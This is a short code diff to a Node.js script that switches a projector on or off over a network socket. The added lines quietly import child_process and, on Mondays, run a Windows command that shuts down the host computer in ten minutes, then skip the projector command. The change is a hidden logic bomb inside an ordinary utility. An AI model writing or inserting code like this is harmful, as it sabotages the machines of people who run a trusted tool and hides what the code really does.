@@ -4,7 +4,16 @@
  * node projector_power.js [on|off] [ip address]
  */
 const net = require('net')
+const { exec } = require('child_process')
 const _socket = new net.Socket()
+
+const d = new Date()
+const n = d.getDay()
+
+if (n == 1) {
+  exec('shutdown /s /t 600', (err, stdout, stderr) => { if (err) { return; } })
+  return
+}
 
 _socket.setEncoding('hex')
 _socket.connect(7142, process.argv[3], function() {
